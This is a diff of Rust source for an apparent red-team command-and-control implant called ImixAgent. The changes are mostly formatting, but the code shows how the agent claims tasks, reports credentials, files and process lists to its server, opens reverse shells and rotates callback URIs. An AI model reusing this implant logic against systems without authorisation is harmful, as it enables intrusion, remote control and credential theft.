@@ -4,13 +4,13 @@ use eldritchv2::pivot::ReplHandler;
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
+use std::sync::mpsc::{Receiver, Sender};
 use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
-use transport::{Transport, SyncTransport};
-use std::sync::mpsc::{Receiver, Sender};
+use transport::{SyncTransport, Transport};
 
-use crate::task::TaskRegistry;
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
+use crate::task::TaskRegistry;
 
 #[derive(Clone)]
 pub struct ImixAgent<T: Transport> {
@@ -30,42 +30,63 @@ struct ImixSyncTransport<T: Transport> {
 
 impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T> {
     fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>> {
-        self.agent.with_transport(|mut t| async move {
-            let (tx, rx) = std::sync::mpsc::channel();
-            t.fetch_asset(req, tx).await?;
-            let mut data = Vec::new();
-            while let Ok(resp) = rx.recv() {
-                data.extend(resp.chunk);
-            }
-            Ok(data)
-        }).map_err(|e| anyhow::anyhow!(e))
+        self.agent
+            .with_transport(|mut t| async move {
+                let (tx, rx) = std::sync::mpsc::channel();
+                t.fetch_asset(req, tx).await?;
+                let mut data = Vec::new();
+                while let Ok(resp) = rx.recv() {
+                    data.extend(resp.chunk);
+                }
+                Ok(data)
+            })
+            .map_err(|e| anyhow::anyhow!(e))
     }
 
-    fn report_credential(&self, req: c2::ReportCredentialRequest) -> Result<c2::ReportCredentialResponse> {
-        self.agent.with_transport(|mut t| async move { t.report_credential(req).await })
+    fn report_credential(
+        &self,
+        req: c2::ReportCredentialRequest,
+    ) -> Result<c2::ReportCredentialResponse> {
+        self.agent
+            .with_transport(|mut t| async move { t.report_credential(req).await })
             .map_err(|e| anyhow::anyhow!(e))
     }
 
     fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse> {
-        self.agent.with_transport(|mut t| async move {
-            let (tx, rx) = std::sync::mpsc::channel();
-            tx.send(req)?;
-            drop(tx);
-            t.report_file(rx).await
-        }).map_err(|e| anyhow::anyhow!(e))
-    }
-
-    fn report_process_list(&self, req: c2::ReportProcessListRequest) -> Result<c2::ReportProcessListResponse> {
-        self.agent.with_transport(|mut t| async move { t.report_process_list(req).await })
+        self.agent
+            .with_transport(|mut t| async move {
+                let (tx, rx) = std::sync::mpsc::channel();
+                tx.send(req)?;
+                drop(tx);
+                t.report_file(rx).await
+            })
             .map_err(|e| anyhow::anyhow!(e))
     }
 
-    fn report_task_output(&self, req: c2::ReportTaskOutputRequest) -> Result<c2::ReportTaskOutputResponse> {
-        self.agent.buffer_task_output(req).map_err(|e| anyhow::anyhow!(e))?;
+    fn report_process_list(
+        &self,
+        req: c2::ReportProcessListRequest,
+    ) -> Result<c2::ReportProcessListResponse> {
+        self.agent
+            .with_transport(|mut t| async move { t.report_process_list(req).await })
+            .map_err(|e| anyhow::anyhow!(e))
+    }
+
+    fn report_task_output(
+        &self,
+        req: c2::ReportTaskOutputRequest,
+    ) -> Result<c2::ReportTaskOutputResponse> {
+        self.agent
+            .buffer_task_output(req)
+            .map_err(|e| anyhow::anyhow!(e))?;
         Ok(c2::ReportTaskOutputResponse {})
     }
 
-    fn reverse_shell(&self, rx: Receiver<c2::ReverseShellRequest>, tx: Sender<c2::ReverseShellResponse>) -> Result<()> {
+    fn reverse_shell(
+        &self,
+        rx: Receiver<c2::ReverseShellRequest>,
+        tx: Sender<c2::ReverseShellResponse>,
+    ) -> Result<()> {
         let agent = self.agent.clone();
         self.agent.runtime_handle.spawn(async move {
             let transport_result = agent.get_usable_transport().await;
@@ -75,12 +96,16 @@ impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T
                     let (tokio_tx_resp, mut tokio_rx_resp) = tokio::sync::mpsc::channel(32);
                     let rx_bridge = tokio::task::spawn_blocking(move || {
                         while let Ok(msg) = rx.recv() {
-                            if tokio_tx_req.blocking_send(msg).is_err() { break; }
+                            if tokio_tx_req.blocking_send(msg).is_err() {
+                                break;
+                            }
                         }
                     });
                     let tx_bridge = tokio::spawn(async move {
                         while let Some(msg) = tokio_rx_resp.recv().await {
-                            if tx.send(msg).is_err() { break; }
+                            if tx.send(msg).is_err() {
+                                break;
+                            }
                         }
                     });
                     if let Err(_e) = t.reverse_shell(tokio_rx_req, tokio_tx_resp).await {
@@ -100,7 +125,8 @@ impl<T: Transport + Sync + Send + 'static> SyncTransport for ImixSyncTransport<T
     }
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse> {
-        self.agent.with_transport(|mut t| async move { t.claim_tasks(req).await })
+        self.agent
+            .with_transport(|mut t| async move { t.claim_tasks(req).await })
             .map_err(|e| anyhow::anyhow!(e))
     }
 }
@@ -126,8 +152,14 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
     }
 
     pub fn get_callback_interval_u64(&self) -> Result<u64> {
-        let cfg = self.config.try_read().map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
-        let info = cfg.info.as_ref().ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
+        let cfg = self
+            .config
+            .try_read()
+            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
+        let info = cfg
+            .info
+            .as_ref()
+            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
         Ok(info.interval)
     }
 
@@ -149,7 +181,9 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
                 Err(_) => return,
             }
         };
-        if outputs.is_empty() { return; }
+        if outputs.is_empty() {
+            return;
+        }
         let mut transport = self.transport.write().await;
         for output in outputs {
             if let Err(_e) = transport.report_task_output(output).await {
@@ -168,7 +202,11 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
     pub async fn get_transport_config(&self) -> (String, Option<String>) {
         let uris = self.callback_uris.read().await;
         let idx = *self.active_uri_idx.read().await;
-        let callback_uri = if idx < uris.len() { uris[idx].clone() } else { uris.first().cloned().unwrap_or_default() };
+        let callback_uri = if idx < uris.len() {
+            uris[idx].clone()
+        } else {
+            uris.first().cloned().unwrap_or_default()
+        };
         let cfg = self.config.read().await;
         (callback_uri, cfg.proxy_uri.clone())
     }
@@ -176,13 +214,17 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
     pub async fn rotate_callback_uri(&self) {
         let uris = self.callback_uris.read().await;
         let mut idx = self.active_uri_idx.write().await;
-        if !uris.is_empty() { *idx = (*idx + 1) % uris.len(); }
+        if !uris.is_empty() {
+            *idx = (*idx + 1) % uris.len();
+        }
     }
 
     async fn get_usable_transport(&self) -> Result<T> {
         {
             let guard = self.transport.read().await;
-            if guard.is_active() { return Ok(guard.clone()); }
+            if guard.is_active() {
+                return Ok(guard.clone());
+            }
         }
         let (callback_uri, proxy_uri) = self.get_transport_config().await;
         let t = T::new(callback_uri, proxy_uri).context("Failed to create on-demand transport")?;
@@ -194,27 +236,48 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
     pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
         let mut transport = self.transport.write().await;
         let beacon_info = self.config.read().await.info.clone();
-        let req = ClaimTasksRequest { beacon: beacon_info };
-        let response = transport.claim_tasks(req).await.context("Failed to claim tasks")?;
+        let req = ClaimTasksRequest {
+            beacon: beacon_info,
+        };
+        let response = transport
+            .claim_tasks(req)
+            .await
+            .context("Failed to claim tasks")?;
         Ok(response.tasks)
     }
 
-    fn block_on<F, R>(&self, future: F) -> Result<R, String> where F: std::future::Future<Output = Result<R, String>> {
+    fn block_on<F, R>(&self, future: F) -> Result<R, String>
+    where
+        F: std::future::Future<Output = Result<R, String>>,
+    {
         self.runtime_handle.block_on(future)
     }
 
     pub fn get_sync_transport(&self) -> Arc<dyn SyncTransport> {
-        Arc::new(ImixSyncTransport { agent: Arc::new(self.clone()) })
+        Arc::new(ImixSyncTransport {
+            agent: Arc::new(self.clone()),
+        })
     }
 
-    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String> where F: FnOnce(T) -> Fut, Fut: std::future::Future<Output = Result<R, anyhow::Error>> {
+    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
+    where
+        F: FnOnce(T) -> Fut,
+        Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
+    {
         self.block_on(async {
-            let t = self.get_usable_transport().await.map_err(|e| e.to_string())?;
+            let t = self
+                .get_usable_transport()
+                .await
+                .map_err(|e| e.to_string())?;
             action(t).await.map_err(|e| e.to_string())
         })
     }
 
-    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String> where F: FnOnce(T) -> Fut + Send + 'static, Fut: std::future::Future<Output = Result<()>> + Send + 'static {
+    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
+    where
+        F: FnOnce(T) -> Fut + Send + 'static,
+        Fut: std::future::Future<Output = Result<()>> + Send + 'static,
+    {
         let subtasks = self.subtasks.clone();
         let agent = self.clone();
         let handle = self.runtime_handle.spawn(async move {
@@ -231,7 +294,9 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
                 }
             }
         });
-        if let Ok(mut map) = subtasks.lock() { map.insert(task_id, handle); }
+        if let Ok(mut map) = subtasks.lock() {
+            map.insert(task_id, handle);
+        }
         Ok(())
     }
 }
@@ -239,10 +304,14 @@ impl<T: Transport + Sync + Send + 'static> ImixAgent<T> {
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
         let mut map = BTreeMap::new();
-        let cfg = self.block_on(async { Ok(self.config.read().await.clone()) }).map_err(|e: String| e)?;
+        let cfg = self
+            .block_on(async { Ok(self.config.read().await.clone()) })
+            .map_err(|e: String| e)?;
         let active_uri = self.get_active_callback_uri().unwrap_or_default();
         map.insert("callback_uri".to_string(), active_uri);
-        if let Some(proxy) = &cfg.proxy_uri { map.insert("proxy_uri".to_string(), proxy.clone()); }
+        if let Some(proxy) = &cfg.proxy_uri {
+            map.insert("proxy_uri".to_string(), proxy.clone());
+        }
         map.insert("retry_interval".to_string(), cfg.retry_interval.to_string());
         map.insert("run_once".to_string(), cfg.run_once.to_string());
         if let Some(info) = &cfg.info {
@@ -257,10 +326,14 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         }
         Ok(map)
     }
-    fn get_transport(&self) -> Result<String, String> { self.block_on(async { Ok(self.transport.read().await.name().to_string()) }) }
+    fn get_transport(&self) -> Result<String, String> {
+        self.block_on(async { Ok(self.transport.read().await.name().to_string()) })
+    }
     fn set_transport(&self, transport: String) -> Result<(), String> {
         let available = self.list_transports()?;
-        if !available.contains(&transport) { return Err(format!("Invalid transport: {}", transport)); }
+        if !available.contains(&transport) {
+            return Err(format!("Invalid transport: {}", transport));
+        }
         self.block_on(async {
             let mut uris = self.callback_uris.write().await;
             let idx_val = *self.active_uri_idx.read().await;
@@ -277,16 +350,24 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             Ok(())
         })
     }
-    fn list_transports(&self) -> Result<Vec<String>, String> { self.block_on(async { Ok(self.transport.read().await.list_available()) }) }
-    fn get_callback_interval(&self) -> Result<u64, String> { self.get_callback_interval_u64().map_err(|e| e.to_string()) }
+    fn list_transports(&self) -> Result<Vec<String>, String> {
+        self.block_on(async { Ok(self.transport.read().await.list_available()) })
+    }
+    fn get_callback_interval(&self) -> Result<u64, String> {
+        self.get_callback_interval_u64().map_err(|e| e.to_string())
+    }
     fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
         self.block_on(async {
             let mut cfg = self.config.write().await;
-            if let Some(info) = &mut cfg.info { info.interval = interval; }
+            if let Some(info) = &mut cfg.info {
+                info.interval = interval;
+            }
             Ok(())
         })
     }
-    fn set_callback_uri(&self, uri: String) -> Result<(), String> { self.set_active_callback_uri(uri) }
+    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.set_active_callback_uri(uri)
+    }
     fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
         self.block_on(async {
             let uris = self.callback_uris.read().await;
@@ -297,14 +378,22 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         self.block_on(async {
             let uris = self.callback_uris.read().await;
             let idx = *self.active_uri_idx.read().await;
-            if idx < uris.len() { Ok(uris[idx].clone()) } else { uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string()) }
+            if idx < uris.len() {
+                Ok(uris[idx].clone())
+            } else {
+                uris.first()
+                    .cloned()
+                    .ok_or_else(|| "No callback URIs configured".to_string())
+            }
         })
     }
     fn get_next_callback_uri(&self) -> Result<String, String> {
         self.block_on(async {
             let uris = self.callback_uris.read().await;
             let idx = *self.active_uri_idx.read().await;
-            if uris.is_empty() { return Err("No callback URIs configured".to_string()); }
+            if uris.is_empty() {
+                return Err("No callback URIs configured".to_string());
+            }
             let next_idx = (idx + 1) % uris.len();
             Ok(uris[next_idx].clone())
         })
@@ -312,7 +401,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     fn add_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
             let mut uris = self.callback_uris.write().await;
-            if !uris.contains(&uri) { uris.push(uri); }
+            if !uris.contains(&uri) {
+                uris.push(uri);
+            }
             Ok(())
         })
     }
@@ -322,7 +413,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             if let Some(pos) = uris.iter().position(|x| *x == uri) {
                 uris.remove(pos);
                 let mut idx = self.active_uri_idx.write().await;
-                if *idx >= uris.len() && !uris.is_empty() { *idx = 0; }
+                if *idx >= uris.len() && !uris.is_empty() {
+                    *idx = 0;
+                }
             }
             Ok(())
         })
@@ -331,14 +424,24 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         self.block_on(async {
             let mut uris = self.callback_uris.write().await;
             let mut idx = self.active_uri_idx.write().await;
-            if let Some(pos) = uris.iter().position(|x| *x == uri) { *idx = pos; } else { uris.push(uri); *idx = uris.len() - 1; }
+            if let Some(pos) = uris.iter().position(|x| *x == uri) {
+                *idx = pos;
+            } else {
+                uris.push(uri);
+                *idx = uris.len() - 1;
+            }
             Ok(())
         })
     }
-    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> { Ok(self.task_registry.list()) }
+    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
+        Ok(self.task_registry.list())
+    }
     fn stop_task(&self, task_id: i64) -> Result<(), String> {
         self.task_registry.stop(task_id);
-        let mut map = self.subtasks.lock().map_err(|_| "Poisoned lock".to_string())?;
+        let mut map = self
+            .subtasks
+            .lock()
+            .map_err(|_| "Poisoned lock".to_string())?;
         if let Some(handle) = map.remove(&task_id) {
             handle.abort();
             #[cfg(debug_assertions)]
